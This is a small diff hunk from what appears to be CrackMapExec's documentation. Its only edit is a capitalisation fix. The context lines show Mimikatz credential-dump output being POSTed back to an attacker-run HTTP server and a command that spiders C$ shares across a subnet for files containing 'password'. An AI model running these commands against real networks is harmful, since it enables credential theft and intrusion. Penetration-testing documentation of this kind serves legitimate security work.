@@ -259,7 +259,7 @@ Mimikatz's output then gets POST'ed back to our HTTP server, saved to a log file
 [*] 172.16.206.132 Saved POST data to Mimikatz-172.16.206.132-2015-08-19_18:57:48.log
 ``` 
 
-Lets Spider the C$ share starting from the ```Users``` folder for the pattern ```password``` in all files and directories (concurrently):
+Lets spider the C$ share starting from the ```Users``` folder for the pattern ```password``` in all files and directories (concurrently):
 ```
 #~ python crackmapexec.py -t 150 172.16.206.0/24 -u username -p password --spider Users --depth 10 --pattern password
 [*] 172.16.206.132:445 is running Windows 6.1 Build 7601 (name:DRUGCOMPANY-PC) (domain:DRUGCOMPANY-PC)
